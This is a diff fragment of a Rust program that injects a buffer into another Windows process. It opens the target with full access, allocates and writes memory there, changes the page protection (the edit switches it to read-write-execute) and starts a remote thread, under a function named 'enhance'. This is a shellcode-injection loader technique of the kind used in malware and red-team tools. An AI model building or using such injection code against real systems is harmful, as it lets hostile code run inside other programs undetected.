@@ -4,7 +4,7 @@ use sysinfo::{PidExt, ProcessExt, System, SystemExt};
 use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;
 use windows::Win32::System::Memory::VirtualAllocEx;
 use windows::Win32::System::Memory::VirtualProtectEx;
-use windows::Win32::System::Memory::{MEM_COMMIT, PAGE_EXECUTE_READ, PAGE_READWRITE};
+use windows::Win32::System::Memory::{MEM_COMMIT, PAGE_EXECUTE_READWRITE, PAGE_READWRITE};
 use windows::Win32::System::Threading::CreateRemoteThread;
 use windows::Win32::System::Threading::OpenProcess;
 use windows::Win32::System::Threading::PROCESS_ALL_ACCESS;
@@ -38,12 +38,12 @@ fn enhance(buf: &Vec<u8>, tar: &u32) {
             buf.len(),
             Some(&mut byteswritten),
         );
-        let mut old_perms = PAGE_EXECUTE_READ;
+        let mut old_perms = PAGE_EXECUTE_READWRITE;
         let _bool = VirtualProtectEx(
             h_process,
             result_ptr,
             buf.len(),
-            PAGE_EXECUTE_READ,
+            PAGE_EXECUTE_READWRITE,
             &mut old_perms,
         );
         let _res_crt = CreateRemoteThread(
